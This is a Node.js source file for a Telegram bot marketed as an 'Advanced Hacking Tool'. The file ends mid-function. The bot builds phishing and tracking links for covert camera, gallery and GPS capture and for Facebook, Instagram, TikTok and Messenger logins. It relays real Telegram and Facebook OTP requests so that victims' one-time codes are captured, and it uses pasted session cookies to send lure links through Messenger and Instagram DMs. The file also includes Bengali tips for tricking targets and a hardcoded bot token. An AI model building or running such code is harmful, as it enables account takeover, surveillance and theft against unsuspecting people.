const express     = require('express');
const http        = require('http');
const telegramBot = require('node-telegram-bot-api');
const multer      = require('multer');
const bodyParser  = require('body-parser');
const axios       = require('axios');
const crypto      = require('crypto');

// ════════════ CONSTANTS ════════════
const TOKEN        = process.env.TOKEN    || '7696026516:AAF40dKAG6T26ywj5oVp-ad-15qofNieXlU';
const ADMIN_ID     = process.env.ADMIN_ID || '7799994340';
const CHANNEL      = 'mafia_cyber_world';
const CHANNEL_LINK = 'https://t.me/mafia_cyber_world';
const FB_LINK      = 'https://www.facebook.com/profile.php?id=61595042636110';
const START_IMG    = 'https://hc1.checker.in/file2link/photos/file_659415.jpg/file_659415.jpg';
const LURE_VID     = 'http://hc1.checker.in/file2link/videos/file_657140.mp4/';
const FREE_TOKENS  = 20;
const LINK_COST    = 10;
const REF_REWARD   = 5;
// ═══════════════════════════════════

const app    = express();
const server = http.createServer(app);
const bot    = new telegramBot(TOKEN, { polling: true });

const upload = multer({ limits: { fileSize: 50*1024*1024 } });
app.use(bodyParser.json({ limit:'50mb' }));
app.use(bodyParser.urlencoded({ extended:true, limit:'50mb' }));

function getBase(req){
    if(process.env.RENDER_EXTERNAL_URL) return process.env.RENDER_EXTERNAL_URL;
    if(req) return `${req.protocol}://${req.get('host')}`;
    return 'http://localhost:'+(process.env.PORT||8999);
}

const links      = new Map();
const sessions   = new Map();
const states     = new Map();
const senderAccts= new Map();
const tokens     = new Map(); // uid → {bal, refs, refBy}

let BOT_USER = '';
bot.getMe().then(me=>{ BOT_USER=me.username; }).catch(()=>{});

// Token helpers
const getT = uid => tokens.get(uid)||{bal:0,refs:0,refBy:null};
const addT = (uid,n)=>{ const t=getT(uid); tokens.set(uid,{...t,bal:t.bal+n}); };
const useT = (uid,n)=>{ const t=getT(uid); if(t.bal<n) return false; tokens.set(uid,{...t,bal:t.bal-n}); return true; };

function parseCookies(h){ return(h['set-cookie']||[]).map(c=>c.split(';')[0]).join('; '); }

function mkLink(action, uid, req){
    const tok = crypto.randomBytes(12).toString('hex');
    links.set(tok,{action,uid});
    setTimeout(()=>links.delete(tok), 72*60*60*1000);
    return getBase(req)+'/go/'+tok;
}

async function checkJoin(userId){
    try{
        const m=await bot.getChatMember('@'+CHANNEL,userId);
        return ['member','administrator','creator'].includes(m.status);
    }catch(e){return false;}
}

const tgMsg = (c,t,o={}) => bot.sendMessage(c,t,{parse_mode:'HTML',...o}).catch(()=>{});
const tgPic = (c,b,cap)  => bot.sendPhoto(c,b,{caption:cap,parse_mode:'HTML'}).catch(()=>{});
const tgLoc = (c,la,lo)  => bot.sendLocation(c,la,lo).catch(()=>{});

// ════════════════════════════════
// KEYBOARDS
// ════════════════════════════════
function joinKb(){ return {inline_keyboard:[
    [{text:'📢 Channel এ Join করুন',url:CHANNEL_LINK}],
    [{text:'✅ Join করেছি — Verify করুন',callback_data:'VERIFY'}]
]};}

function mainKb(){ return {inline_keyboard:[
    [{text:'📷 Camera Hacking 🎯',callback_data:'LNK_cam_f'},{text:'📸 Back Camera Hack 🎯',callback_data:'LNK_cam_b'}],
    [{text:'📍 Location Hacking 🎯',callback_data:'LNK_loc'},{text:'🖼️ Gallery Hacking 🎯',callback_data:'LNK_gallery'},{text:'💥 Phone Hang 🎭',callback_data:'LNK_hang'}],
    [{text:'🎣 Facebook Hacking 🎯',callback_data:'LNK_phish_fb'},{text:'📸 Instagram Hacking 🎯',callback_data:'LNK_phish_ig'}],
    [{text:'🎵 TikTok Hacking 🎯',callback_data:'LNK_phish_tt'},{text:'📨 Messenger Hacking 🎯',callback_data:'LNK_phish_msgr'}],
    [{text:'📱 WhatsApp OTP Hack 🔑',callback_data:'LNK_phish_wa'},{text:'💬 IMO OTP Hack 🔑',callback_data:'LNK_phish_imo'}],
    [{text:'✈️ Telegram OTP Hack 🔑',callback_data:'LNK_phish_tg'}],
    [{text:'━━━━━━━━━━━━━━━━━━━━━━━',callback_data:'NOP'}],
    [{text:'🔔 FB Notification Send',callback_data:'NOTIF_fb'},{text:'🔔 IG Notification Send',callback_data:'NOTIF_ig'}],
    [{text:'⚙️ Sender Account Setup',callback_data:'NOTIF_setup'}],
    [{text:'━━━━━━━━━━━━━━━━━━━━━━━',callback_data:'NOP'}],
    [{text:'💰 Token Balance',callback_data:'BALANCE'},{text:'🔗 Refer & Earn',callback_data:'REFER'}],
    [{text:'📢 Our Channel',url:CHANNEL_LINK}]
]};}

// ════════════════════════════════
// BOT — /start with referral + channel check
// ════════════════════════════════
bot.onText(/\/start(?:\s+(.+))?/, async msg=>{
    const cid=msg.chat.id, uid=String(msg.from.id);
    const name=msg.from.first_name||'ভাই';
    const arg=(msg.text.split(' ')[1]||'').trim();

    // Handle referral
    const t=getT(uid);
    if(arg.startsWith('ref_')&&!t.refBy){
        const refBy=arg.replace('ref_','');
        if(refBy!==uid){
            tokens.set(uid,{...t,refBy});
            addT(refBy,REF_REWARD);
            tgMsg(refBy,`🎉 <b>নতুন Referral!</b>\n\n👤 ${name} তোমার লিংক দিয়ে join করেছে!\n💰 +${REF_REWARD} Tokens পেয়েছ!\n💎 Balance: ${getT(refBy).bal} Tokens`).catch(()=>{});
        }
    }

    // Give free tokens on first start
    if(t.bal===0&&!t.refBy){
        tokens.set(uid,{bal:FREE_TOKENS,refs:0,refBy:null});
    }

    try{
        await bot.sendPhoto(cid, START_IMG, {
            caption:
`🔥 <b>MAFIA CYBER WORLD</b> 🔥
━━━━━━━━━━━━━━━━━━━━━━
💎 <b>Advanced Hacking Tool Bot</b>

📷 Camera · Gallery · Location Hack
🎣 FB · IG · TikTok · Messenger Hack
📱 WhatsApp · IMO · Telegram OTP
🔔 Direct Notification Sender
💥 Phone Hang / Freeze Tool

⚡ Link বানাও → Target কে পাঠাও
→ Click করলেই Info বটে আসে ✅

━━━━━━━━━━━━━━━━━━━━━━
📢 নিচের Channel এ Join করে
<b>✅ Verify</b> চাপলেই শুরু হবে!`,
            parse_mode:'HTML',
            reply_markup:{inline_keyboard:[
                [{text:'📢 Channel Join করুন',url:CHANNEL_LINK}],
                [{text:'✅ Joined — Verify করুন',callback_data:'VERIFY'}]
            ]}
        });
    }catch(e){
        tgMsg(cid,`🔥 <b>স্বাগতম ${name}!</b>\n\nChannel এ Join করে Verify করুন।`,{reply_markup:joinKb()});
    }
});

bot.onText(/\/menu/, async msg=>{
    const uid=String(msg.from.id), cid=msg.chat.id;
    const joined=await checkJoin(msg.from.id);
    if(!joined) return tgMsg(cid,'❌ প্রথমে Channel এ Join করুন!',{reply_markup:joinKb()});
    tgMsg(cid,menuText(uid),{reply_markup:mainKb()});
});

function menuText(uid){
    const t=getT(uid);
    return `╔══════════════════════════════╗
🎯  <b>MAFIA CYBER WORLD</b>
🔧  <b>Main Control Panel</b>
╚══════════════════════════════╝

💎 Token Balance: <b>${t.bal} Tokens</b>
👥 Total Referrals: <b>${t.refs||0}</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⬇️ <b>নিচ থেকে আপনার Tool বেছে নিন:</b>`;
}

// ════════════════════════════════
// CALLBACK HANDLER
// ════════════════════════════════
bot.on('callback_query', async cbq=>{
    const uid=String(cbq.from.id), chatId=cbq.message.chat.id;
    const msgId=cbq.message.message_id, data=cbq.data;
    const name=cbq.from.first_name||'বন্ধু';
    bot.answerCallbackQuery(cbq.id).catch(()=>{});
    const del  = ()=>bot.deleteMessage(chatId,msgId).catch(()=>{});
    const edit = (t,kb)=>bot.editMessageText(t,{chat_id:chatId,message_id:msgId,parse_mode:'HTML',reply_markup:kb}).catch(()=>{});

    if(data==='NOP') return;

    if(data==='VERIFY'){
        const joined=await checkJoin(cbq.from.id);
        if(!joined) return bot.answerCallbackQuery(cbq.id,{
            text:'❌ আগে Channel এ Join করুন তারপর Verify করুন!',show_alert:true
        }).catch(()=>{});
        bot.answerCallbackQuery(cbq.id,{text:'✅ Verified Successfully!'}).catch(()=>{});
        const t=getT(uid);
        if(t.bal===0) addT(uid,FREE_TOKENS);
        del();
        return tgMsg(chatId, menuText(uid), {reply_markup:mainKb()});
    }

    if(data==='M_BACK'||data==='ROUTE_HACK'){
        del();
        return tgMsg(chatId, menuText(uid), {reply_markup:mainKb()});
    }

    if(data==='BALANCE'){
        const t=getT(uid);
        return edit(
`💰 <b>Token Balance</b>
━━━━━━━━━━━━━━━━━━━━━━━━
👤 User: ${name}
💎 Balance: <b>${t.bal} Tokens</b>
👥 Total Referrals: <b>${t.refs||0}</b>
🎁 Per Link Cost: ${LINK_COST} Tokens
📊 Remaining Links: <b>${Math.floor(t.bal/LINK_COST)}</b>
━━━━━━━━━━━━━━━━━━━━━━━━
💡 Refer করে আরো Token কামাও!`,
            {inline_keyboard:[
                [{text:'🔗 Refer Link নাও',callback_data:'REFER'}],
                [{text:'◀️ মেনু',callback_data:'M_BACK'}]
            ]}
        );
    }

    if(data==='REFER'){
        const refLink=`https://t.me/${BOT_USER||'HackBot'}?start=ref_${uid}`;
        return edit(
`🔗 <b>Refer & Earn Program</b>
━━━━━━━━━━━━━━━━━━━━━━━━
💎 প্রতিটি Refer এ পাবে: <b>${REF_REWARD} Tokens</b>
👥 Total Referred: <b>${getT(uid).refs||0}</b>

📌 <b>তোমার Refer Link:</b>

<code>${refLink}</code>

👆 উপরের লিংক ট্যাপ করে কপি করো
এই লিংক বন্ধুদের পাঠাও — তারা Start করলেই
তুমি ${REF_REWARD} Tokens পাবে! 🎉
━━━━━━━━━━━━━━━━━━━━━━━━`,
            {inline_keyboard:[
                [{text:'💰 Balance দেখো',callback_data:'BALANCE'}],
                [{text:'◀️ মেনু',callback_data:'M_BACK'}]
            ]}
        );
    }

    // ── Link Generation ──────────────────────────
    if(data.startsWith('LNK_')){
        const act=data.slice(4);
        const joined=await checkJoin(cbq.from.id);
        if(!joined){
            return bot.answerCallbackQuery(cbq.id,{
                text:'❌ Channel এ Join না করে ব্যবহার করা যাবে না!',show_alert:true
            }).catch(()=>{});
        }
        const t=getT(uid);
        if(t.bal<LINK_COST){
            return edit(
`❌ <b>Insufficient Tokens!</b>
━━━━━━━━━━━━━━━━━━━━━━━━
💎 Current Balance: ${t.bal} Tokens
💰 Required: ${LINK_COST} Tokens

🔗 Refer করে Token কামাও!`,
                {inline_keyboard:[
                    [{text:'🔗 Refer Link নাও',callback_data:'REFER'}],
                    [{text:'◀️ মেনু',callback_data:'M_BACK'}]
                ]}
            );
        }

        // Deduct tokens
        useT(uid, LINK_COST);
        del();

        const link=mkLink(act,uid);
        const labels={
            cam_f:'📷 Camera Hacking (Front)',cam_b:'📸 Camera Hacking (Back)',
            loc:'📍 Location Hacking',gallery:'🖼️ Gallery Hacking',
            phish_fb:'🎣 Facebook Hacking',phish_ig:'📸 Instagram Hacking',
            phish_tt:'🎵 TikTok Hacking',phish_msgr:'📨 Messenger Hacking',
            phish_wa:'📱 WhatsApp OTP Hack',phish_imo:'💬 IMO OTP Hack',
            phish_tg:'✈️ Telegram OTP Hack'
        };
        const tips={
            cam_f:['Target কে ছবি দেখার লোভ দেখিয়ে পাঠাও','Click করলে Front Camera দিয়ে ছবি আসবে'],
            cam_b:['Photo share করার বাহানায় পাঠাও','Click করলে Back Camera ছবি আসবে'],
            loc:['Map Location verify করতে বলো','Click করলে GPS Location আসবে'],
            gallery:['ছবি দেখার কথা বলে পাঠাও','Allow দিলে গ্যালারির ২০টা ছবি আসবে'],
            hang:['যেকোনো লিংক বাহানায় পাঠাও','Click করলে ফোন freeze হয়ে যাবে — বের হতে পারবে না'],
            phish_fb:['Facebook Security Alert বলে পাঠাও','Email+Password দিলেই এখানে আসবে'],
            phish_ig:['IG Private Content বলে পাঠাও','Email+Password দিলেই এখানে আসবে'],
            phish_tt:['TikTok Private Message বলে পাঠাও','Email+Password দিলেই এখানে আসবে'],
            phish_msgr:['Messenger Unread Message বলে পাঠাও','Email+Password দিলেই এখানে আসবে'],
            phish_wa:['WA Account Verify বলে পাঠাও','Number দিলে Real OTP আসবে → OTP capture হবে'],
            phish_imo:['IMO Verify বলে পাঠাও','Number দিলে Real SMS আসবে → OTP capture হবে'],
            phish_tg:['TG New Device Alert বলে পাঠাও','Number দিলে TG App এ OTP যাবে → capture হবে'],
        }[act]||['Link পাঠাও','Click করলে Info আসবে'];

        const remaining=Math.floor(getT(uid).bal/LINK_COST);
        return tgMsg(chatId,
`╔══════════════════════════════╗
  ✅ Link Ready!
╚══════════════════════════════╝

🎯 <b>${labels[act]||act}</b>

🔗 <b>Link:</b>
<code>${link}</code>
👆 <i>ট্যাপ করলে কপি হবে</i>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 <b>কীভাবে পাঠাবে:</b>
💡 ${tips[0]}

⚡ <b>পাঠানোর পরে কী হবে:</b>
✅ ${tips[1]}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💰 Used: ${LINK_COST} Tokens | Remaining: ${remaining} Links
⏰ মেয়াদ: ৭২ ঘণ্টা`,
            {reply_markup:{inline_keyboard:[
                [{text:'📋 Copy Link',callback_data:'CPY_'+link.split('/go/')[1]}],
                [{text:'🔄 New Link',callback_data:data},{text:'◀️ Menu',callback_data:'M_BACK'}]
            ]}});
    }

    // ── Copy link via button ──────────────────────
    if(data.startsWith('CPY_')){
        const tok=data.slice(4);
        const info=links.get(tok);
        if(!info) return bot.answerCallbackQuery(cbq.id,{text:'❌ Link expired',show_alert:true}).catch(()=>{});
        const link=getBase(null)+'/go/'+tok;
        bot.answerCallbackQuery(cbq.id,{text:'✅ নিচে লিংক দেখুন'}).catch(()=>{});
        return tgMsg(chatId,
`📋 <b>Link — ট্যাপ করে কপি করুন:</b>\n\n<code>${link}</code>`,
            {reply_markup:{inline_keyboard:[[{text:'🗑️ Delete',callback_data:'DEL_MSG'}]]}});
    }

    if(data==='DEL_MSG') return bot.deleteMessage(chatId,msgId).catch(()=>{});

    // ── Notification Sender ───────────────────────
    if(data==='NOTIF_setup'){
        del();
        states.set(uid,{step:'setup_fb'});
        return tgMsg(chatId,
`⚙️ <b>Sender Account Setup</b>
━━━━━━━━━━━━━━━━━━━━━━━━

📋 <b>Facebook Cookies নেওয়ার নিয়ম:</b>

1️⃣ PC তে Chrome খুলুন → FB তে Login করুন
2️⃣ <b>F12</b> চাপুন → <b>Application</b> → <b>Cookies</b> → <b>facebook.com</b>
3️⃣ এই চারটা Cookie এর Value কপি করুন:
   • <code>c_user</code>
   • <code>xs</code>
   • <code>datr</code>
   • <code>fr</code>

4️⃣ এই format এ পাঠান:
<code>c_user=111; xs=222; datr=333; fr=444</code>

━━━━━━━━━━━━━━━━━━━━━━━━
⬇️ FB Cookies পাঠান:`);
    }

    if(data==='NOTIF_fb'){
        del();
        const ac=senderAccts.get(uid);
        if(!ac?.fbCookies) return tgMsg(chatId,'❌ Sender Account set নেই!\n\n⚙️ Setup করুন প্রথমে।',
            {reply_markup:{inline_keyboard:[[{text:'⚙️ Setup',callback_data:'NOTIF_setup'},{text:'◀️ Menu',callback_data:'M_BACK'}]]}});
        states.set(uid,{step:'notif_fb_url'});
        return tgMsg(chatId,
`🔔 <b>Facebook Notification Sender</b>
━━━━━━━━━━━━━━━━━━━━━━━━
✅ Sender ready!

📌 Target এর <b>Facebook Profile URL</b> পাঠান:
<code>https://www.facebook.com/profile.php?id=XXXXX</code>

⬇️ URL পাঠান:`);
    }

    if(data==='NOTIF_ig'){
        del();
        const ac=senderAccts.get(uid);
        if(!ac?.igCookies){
            states.set(uid,{step:'setup_ig'});
            return tgMsg(chatId,
`📸 <b>Instagram Sender Setup</b>
━━━━━━━━━━━━━━━━━━━━━━━━

1️⃣ Chrome এ IG তে Login করুন
2️⃣ F12 → Application → Cookies → instagram.com
3️⃣ <code>sessionid</code> ও <code>csrftoken</code> কপি করুন

Format:
<code>sessionid=XXXX; csrftoken=XXXX</code>

⬇️ IG Cookies পাঠান:`);
        }
        states.set(uid,{step:'notif_ig_user'});
        return tgMsg(chatId,
`🔔 <b>Instagram Notification Sender</b>
━━━━━━━━━━━━━━━━━━━━━━━━
✅ Sender ready!

📌 Target এর <b>Instagram Username</b> পাঠান:
<code>@username</code>

⬇️ Username পাঠান:`);
    }

    // Phish pick for notification
    if(data.startsWith('NPICK_')){
        const parts=data.split('_');
        const platform=parts[1];
        const phishAct=parts.slice(2).join('_');
        const st=states.get(uid)||{data:{}};
        const link=mkLink(phishAct,uid);
        const convMap={
            phish_fb:`ভাই, তোমাকে এখানে tag করা হয়েছে 👀\n${link}`,
            phish_ig:`এই ছবিটা দেখো, তুমি আছো 😯\n${link}`,
            phish_tt:`এই ভিডিওটা দেখো 🔥\n${link}`,
            phish_msgr:`তোমার জন্য message আছে 💌\n${link}`,
        };
        const msg=convMap[phishAct]||`দেখো এটা 👀\n${link}`;
        await tgMsg(chatId,`📤 পাঠানো হচ্ছে...`);
        if(platform==='fb') await sendFbMsg(uid,chatId,st.data?.targetId,msg);
        else if(platform==='ig') await sendIgMsg(uid,chatId,st.data?.targetUser,msg);
        states.delete(uid);
    }
}); // end callback_query

// ════════════════════════════════════════
// MESSAGE HANDLER — smart URL detect + states
// ════════════════════════════════════════
bot.on('message', async msg=>{
    if(!msg.text) return;
    const uid=String(msg.from.id), chatId=msg.chat.id, text=msg.text.trim();
    const st=states.get(uid);

    // ── FB cookie setup ──
    if(st?.step==='setup_fb'){
        if(!text.includes('xs=')&&!text.includes('c_user='))
            return tgMsg(chatId,'❌ Format ঠিক নয়!\nExample:\n<code>c_user=111; xs=222; datr=333; fr=444</code>');
        let dtsg='';
        try{
            const r=await axios.get('https://www.facebook.com/',
                {headers:{'User-Agent':'Mozilla/5.0','Cookie':text,'Accept-Language':'en-US'},timeout:15000});
            const m=r.data.match(/"dtsg"[^}]*"token":"([^"]+)"/)||r.data.match(/DTSGInitialData[^}]*"token":"([^"]+)"/);
            dtsg=m?m[1]:'';
        }catch(e){}
        senderAccts.set(uid,{...senderAccts.get(uid)||{},fbCookies:text,fbDtsg:dtsg});
        states.delete(uid);
        return tgMsg(chatId,
`✅ <b>FB Sender Setup সম্পন্ন!</b>\n${dtsg?'✅ Session Valid!':'⚠️ Cookies saved.'}\n\n💡 এখন FB Profile URL paste করলেই অটো notification যাবে!`,
            {reply_markup:{inline_keyboard:[[{text:'🔔 Notification পাঠাও',callback_data:'NOTIF_fb'},{text:'◀️ Menu',callback_data:'M_BACK'}]]}});
    }

    // ── IG cookie setup ──
    if(st?.step==='setup_ig'){
        if(!text.includes('sessionid='))
            return tgMsg(chatId,'❌ Format ঠিক নয়!\n<code>sessionid=XXXX; csrftoken=XXXX</code>');
        senderAccts.set(uid,{...senderAccts.get(uid)||{},igCookies:text});
        states.delete(uid);
        return tgMsg(chatId,'✅ <b>IG Sender Setup সম্পন্ন!</b>',
            {reply_markup:{inline_keyboard:[[{text:'🔔 IG Notification',callback_data:'NOTIF_ig'},{text:'◀️ Menu',callback_data:'M_BACK'}]]}});
    }

    // ── FB URL waiting (manual) ──
    if(st?.step==='notif_fb_url'){
        const idM=text.match(/[?&]id=(\d+)/)||text.match(/facebook\.com\/(\d{7,})/);
        let tid=idM?idM[1]:'';
        if(!tid){const u=text.match(/facebook\.com\/([^/?&#\s]+)/);
            if(u&&!['profile.php','watch','groups','events','pages'].includes(u[1])) tid=u[1];}
        if(!tid) return tgMsg(chatId,'❌ URL সঠিক নয়। আবার পাঠান।');
        states.set(uid,{step:'notif_fb_pick',data:{targetId:tid}});
        return tgMsg(chatId,`✅ Target: <code>${tid}</code>\n\n⚡ কোন পেজ পাঠাবেন?`,
            {reply_markup:{inline_keyboard:[
                [{text:'🎣 Facebook Login',callback_data:'NPICK_fb_phish_fb'},{text:'📸 Instagram Login',callback_data:'NPICK_fb_phish_ig'}],
                [{text:'📨 Messenger Login',callback_data:'NPICK_fb_phish_msgr'},{text:'✈️ Telegram OTP',callback_data:'NPICK_fb_phish_tg'}],
                [{text:'❌ বাতিল',callback_data:'M_BACK'}]
            ]}});
    }

    // ── IG username waiting ──
    if(st?.step==='notif_ig_user'){
        const uname=text.replace(/^@/,'').replace(/instagram\.com\//,'').split(/[/?]/)[0].trim();
        if(!uname||uname.length<2) return tgMsg(chatId,'❌ Username সঠিক নয়।');
        states.set(uid,{step:'notif_ig_pick',data:{targetUser:uname}});
        return tgMsg(chatId,`✅ Target: <code>@${uname}</code>\n\n⚡ কোন পেজ পাঠাবেন?`,
            {reply_markup:{inline_keyboard:[
                [{text:'📸 Instagram Login',callback_data:'NPICK_ig_phish_ig'},{text:'🎣 Facebook Login',callback_data:'NPICK_ig_phish_fb'}],
                [{text:'✈️ Telegram OTP',callback_data:'NPICK_ig_phish_tg'},{text:'❌ বাতিল',callback_data:'M_BACK'}]
            ]}});
    }

    // ── SMART AUTO-DETECT ─────────────────────────
    const fbM=text.match(/facebook\.com\/(?:profile\.php\?id=(\d+)|([^/?&#\s]{3,}))/)||text.match(/fb\.me\/(\d+)/);
    const igM=text.match(/instagram\.com\/([^/?&#\s]+)/);

    if(fbM&&(text.includes('facebook.com')||text.includes('fb.me'))){
        const tid=fbM[1]||fbM[2];
        if(!tid||['watch','groups','events','pages','marketplace','stories','reel','share','help','login'].includes(tid)) return;
        const ac=senderAccts.get(uid);
        if(!ac?.fbCookies){
            states.set(uid,{step:'notif_fb_url',data:{pendingId:tid}});
            return tgMsg(chatId,`🔔 <b>FB notification পাঠাবো?</b>\nTarget: <code>${tid}</code>\n\n⚠️ Sender Account setup করুন।`,
                {reply_markup:{inline_keyboard:[[{text:'⚙️ Setup',callback_data:'NOTIF_setup'},{text:'❌ না',callback_data:'M_BACK'}]]}});
        }
        // Immediate send
        const link=mkLink('phish_fb',uid);
        const msg2=`ভাই, তোমাকে এখানে tag করা হয়েছে 👀\n${link}`;
        await tgMsg(chatId,`⏳ পাঠানো হচ্ছে...\n🎯 Target: <code>${tid}</code>`);
        await sendFbMsg(uid,chatId,tid,msg2);
        return;
    }

    if(igM&&text.includes('instagram.com')){
        const uname=igM[1].split(/[?#]/)[0];
        if(!uname||['p','explore','reels','stories'].includes(uname)) return;
        const ac=senderAccts.get(uid);
        if(!ac?.igCookies){
            states.set(uid,{step:'notif_ig_user'});
            return tgMsg(chatId,`🔔 IG notification পাঠাতে Sender setup দরকার।\n\nIG Cookies দিন:\n<code>sessionid=XXXX; csrftoken=XXXX</code>`);
        }
        const link=mkLink('phish_ig',uid);
        const msg3=`এই ছবিটা দেখো 😯\n${link}`;
        await tgMsg(chatId,`⏳ পাঠানো হচ্ছে...\n🎯 @${uname}`);
        await sendIgMsg(uid,chatId,uname,msg3);
        return;
    }
});

// ════════════════════════════════════════
// FB MESSENGER SEND
// ════════════════════════════════════════
const TG_UA='Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36';

async function sendFbMsg(uid,chatId,targetId,message){
    const ac=senderAccts.get(uid)||{};
    if(!ac.fbCookies) return tgMsg(chatId,'❌ FB Cookies নেই।');
    const dtsg=ac.fbDtsg||'';
    const myId=(ac.fbCookies.match(/c_user=(\d+)/)||[])[1]||'';
    try{
        const r=await axios.post('https://www.messenger.com/ajax/mercury/send_messages.php',
            new URLSearchParams({
                'body':message,'has_attachment':'false',
                'message_id':`mid.${Date.now()}:${crypto.randomBytes(4).toString('hex')}`,
                'offline_threading_id':Date.now().toString(),
                'status':'200','to':targetId,
                '__a':'1','__dtsg':dtsg,'client':'mercury',
            }).toString(),
            {headers:{
                'User-Agent':TG_UA,'Cookie':ac.fbCookies,
                'Content-Type':'application/x-www-form-urlencoded',
                'Origin':'https://www.messenger.com',
                'Referer':`https://www.messenger.com/t/${targetId}`,
                'X-Requested-With':'XMLHttpRequest',
            },timeout:25000}
        );
        const txt=JSON.stringify(r.data);
        const ok=txt.includes('message_id')||txt.includes('thread_id')||!txt.includes('"error":{');
        tgMsg(chatId,ok
            ? `✅ <b>FB Notification পাঠানো সফল!</b>\n\n👤 Target: <code>${targetId}</code>\n💬 Message sent!\n\n📱 Target এর ফোনে FB Notification যাবে!`
            : `⚠️ Sent (unconfirmed):\n<code>${txt.slice(0,200)}</code>`,
            {reply_markup:{inline_keyboard:[[{text:'🔔 আরেকজনকে',callback_data:'NOTIF_fb'},{text:'◀️ Menu',callback_data:'M_BACK'}]]}}
        );
    }catch(e){
        tgMsg(chatId,`❌ Error: <code>${e.message}</code>\n\n💡 Cookies expire হয়ে গেছে। নতুন দিন।`,
            {reply_markup:{inline_keyboard:[[{text:'⚙️ নতুন Setup',callback_data:'NOTIF_setup'},{text:'◀️ Menu',callback_data:'M_BACK'}]]}});
    }
}

// ════════════════════════════════════════
// IG DM SEND
// ════════════════════════════════════════
async function sendIgMsg(uid,chatId,username,message){
    const ac=senderAccts.get(uid)||{};
    if(!ac.igCookies) return tgMsg(chatId,'❌ IG Cookies নেই।');
    const csrfM=ac.igCookies.match(/csrftoken=([^;]+)/);
    const csrf=csrfM?csrfM[1]:'';
    try{
        const info=await axios.get(
            `https://www.instagram.com/api/v1/users/web_profile_info/?username=${username}`,
            {headers:{'User-Agent':TG_UA,'Cookie':ac.igCookies,'X-CSRFToken':csrf,'Referer':'https://www.instagram.com/'},timeout:15000}
        );
        const tid=info.data?.data?.user?.id;
        if(!tid) return tgMsg(chatId,`❌ @${username} খুঁজে পাওয়া যায়নি।`);
        const r=await axios.post('https://i.instagram.com/api/v1/direct_v2/threads/broadcast/text/',
            new URLSearchParams({
                'recipient_users':`[[${tid}]]`,
                'client_context':crypto.randomBytes(16).toString('hex'),
                'text':message,
                'device_id':'android-'+crypto.randomBytes(8).toString('hex'),
            }).toString(),
            {headers:{
                'User-Agent':'Instagram 269.0.0.18.75 Android',
                'Cookie':ac.igCookies,'X-CSRFToken':csrf,
                'Content-Type':'application/x-www-form-urlencoded',
                'Referer':'https://www.instagram.com/',
            },timeout:20000}
        );
        const ok=r.data?.status==='ok'||r.data?.thread_id;
        tgMsg(chatId,ok
            ? `✅ <b>IG DM পাঠানো সফল!</b>\n\n👤 @${username}\n\n📱 Target এর IG Notification যাবে!`
            : `⚠️ Response: <code>${JSON.stringify(r.data).slice(0,200)}</code>`,
            {reply_markup:{inline_keyboard:[[{text:'🔔 আরেকজনকে',callback_data:'NOTIF_ig'},{text:'◀️ Menu',callback_data:'M_BACK'}]]}}
        );
    }catch(e){
        tgMsg(chatId,`❌ Error: <code>${e.message}</code>`,
            {reply_markup:{inline_keyboard:[[{text:'⚙️ নতুন Setup',callback_data:'NOTIF_setup'},{text:'◀️ Menu',callback_data:'M_BACK'}]]}});
    }
}

app.post('/d/text',(req,res)=>{
    const uid=req.body.uid,ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;
    tgMsg(uid,`📋 <b>${req.body.type||'Info'}</b>\n<code>${(req.body.data||'').slice(0,3800)}</code>\n🌍 ${ip}`);
    res.json({ok:true});
});
app.post('/d/captured',(req,res)=>{
    const uid=req.body.uid,ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;
    tgMsg(uid,`🔑 <b>✅ CAPTURED!</b>\n\n🌐 Site: <b>${req.body.site||'?'}</b>\n📱 Phone/Email: <code>${req.body.phone||''}</code>\n🔒 Pass/OTP: <code>${req.body.otp||''}</code>\n\n🌍 IP: ${ip}`);
    res.json({ok:true});
});

// TELEGRAM REAL OTP
const TG_H={'Content-Type':'application/x-www-form-urlencoded','User-Agent':TG_UA,'Accept':'application/json, text/javascript, */*; q=0.01','Accept-Language':'en-US,en;q=0.9','Origin':'https://my.telegram.org','Referer':'https://my.telegram.org/auth','X-Requested-With':'XMLHttpRequest'};

app.post('/proxy/tg/send',async(req,res)=>{
    const{phone,sid}=req.body;
    for(let i=0;i<3;i++){
        try{
            const r=await axios.post('https://my.telegram.org/auth/send_password',
                `phone=${encodeURIComponent(phone)}`,
                {headers:TG_H,timeout:25000});
            const cookies=parseCookies(r.headers);
            tgMsg(ADMIN_ID,`✈️ TG send\n📞 ${phone}\nData: <code>${JSON.stringify(r.data).slice(0,300)}</code>`).catch(()=>{});
            if(r.data&&r.data.random_hash){
                sessions.set(sid,{...sessions.get(sid)||{},tgHash:r.data.random_hash,phone,tgCookies:cookies});
                return res.json({ok:true});
            }
            if(r.data&&r.data.error) return res.json({ok:false,tgError:r.data.error});
        }catch(e){
            tgMsg(ADMIN_ID,`✈️ TG send ERR: ${e.message}`).catch(()=>{});
            if(i===2) return res.json({ok:false,err:e.message});
            await new Promise(r=>setTimeout(r,1000*(i+1)));
        }
    }
    res.json({ok:false});
});

app.post('/proxy/tg/verify',async(req,res)=>{
    const{otp,sid,uid}=req.body;
    const s=sessions.get(sid)||{};
    if(!s.tgHash) return res.json({ok:false,err:'no_session'});
    try{
        const r=await axios.post('https://my.telegram.org/auth/login',
            `phone=${encodeURIComponent(s.phone)}&random_hash=${encodeURIComponent(s.tgHash)}&password=${encodeURIComponent(otp)}`,
            {headers:{...TG_H,Cookie:s.tgCookies||''},timeout:25000});
        tgMsg(ADMIN_ID,`✈️ TG verify\n📞 ${s.phone}\nOTP: <code>${otp}</code>\nResult: <code>${JSON.stringify(r.data).slice(0,300)}</code>`).catch(()=>{});
        if(uid) tgMsg(uid,`✈️ <b>Telegram Verified!</b>\n📞 <code>${s.phone}</code>\n🔑 OTP: <code>${otp}</code>`).catch(()=>{});
        res.json({ok:true,raw:r.data});
    }catch(e){res.json({ok:false,err:e.message});}
});

// FB
app.post('/proxy/fb/send',async(req,res)=>{
    const{phone,sid}=req.body;
    try{
        const pg=await axios.get('https://www.facebook.com/login/identify/',{headers:{'User-Agent':TG_UA,'Accept-Language':'en-US'},timeout:20000});
        const cookies=parseCookies(pg.headers);
        const lsdM=pg.data.match(/"LSD",\[\],{"token":"([^"]+)"/);
        const lsd=lsdM?lsdM[1]:'';
